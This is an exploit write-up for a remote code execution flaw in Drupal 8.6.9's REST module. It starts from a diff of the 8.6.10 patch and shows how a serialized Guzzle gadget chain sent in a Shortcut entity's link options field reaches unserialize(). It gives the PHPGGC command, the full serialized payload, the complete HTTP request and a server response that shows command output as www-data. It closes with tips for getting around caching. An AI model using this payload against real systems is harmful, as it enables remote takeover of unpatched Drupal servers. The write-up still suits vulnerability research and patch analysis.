@@ -1,0 +1,62 @@
+Analyzing the patch
+By diffing Drupal 8.6.9 and 8.6.10, we can see that in the REST module, FieldItemNormalizer now uses a new trait, SerializedColumnNormalizerTrait. This trait provides the checkForSerializedStrings() method, which in short raises an exception if a string is provided for a value that is stored as a serialized string. This indicates the exploitation vector fairly clearly: through a REST request, the attacker needs to send a serialized property. This property will later be unserialize()d, thing that can easily be exploited using tools such as PHPGGC. Another modified file gives indications as to which property can be used: LinkItem now uses unserialize($values['options'], ['allowed_classes' => FALSE]); instead of the standard unserialize($values['options']);.
+
+As for all FieldItemBase subclasses, LinkItem references a property type. Shortcut uses this property type, for a property named link.
+
+Triggering the unserialize()
+Having all these elements in mind, triggering an unserialize is fairly easy:
+
+GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1
+Host: 192.168.1.25
+Content-Type: application/hal+json
+Content-Length: 642
+
+{
+  "link": [
+    {
+      "value": "link",
+      "options": "<SERIALIZED_CONTENT>"
+    }
+  ],
+  "_links": {
+    "type": {
+      "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default"
+    }
+  }
+}
+Since Drupal 8 uses Guzzle, we can generate a payload using PHPGGC:
+
+$ ./phpggc guzzle/rce1 system id --json
+"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
+We can now send the payload via GET:
+
+GET /drupal-8.6.9/node/1?_format=hal_json HTTP/1.1
+Host: 192.168.1.25
+Content-Type: application/hal+json
+Content-Length: 642
+
+{
+  "link": [
+    {
+      "value": "link",
+      "options": "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";s:2:\"id\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"resolve\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}"
+    }
+  ],
+  "_links": {
+    "type": {
+      "href": "http://192.168.1.25/drupal-8.6.9/rest/type/shortcut/default"
+    }
+  }
+}
+To which Drupal responds:
+
+HTTP/1.1 200 OK
+Link: <...>
+X-Generator: Drupal 8 (https://www.drupal.org)
+X-Drupal-Cache: MISS
+Connection: close
+Content-Type: application/hal+json
+Content-Length: 9012
+
+{...}uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Note: Drupal caches responses: if you're in a testing environment, clear the cache. If not, try another node ID.
